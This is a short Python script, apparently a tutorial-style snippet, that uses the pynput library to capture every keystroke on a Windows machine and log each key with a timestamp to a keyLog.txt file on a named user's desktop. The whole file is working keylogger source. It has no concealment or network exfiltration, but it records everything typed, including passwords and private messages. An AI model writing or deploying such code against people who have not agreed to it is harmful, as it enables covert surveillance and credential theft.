from pynput.keyboard import Key, Listener
import logging

#Specify the file that the keystrokes will be logged to
log_dir = r"C:/Users/Nathan Ellison/Desktop/"
logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

#When a key is pressed, log the key as a string
def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
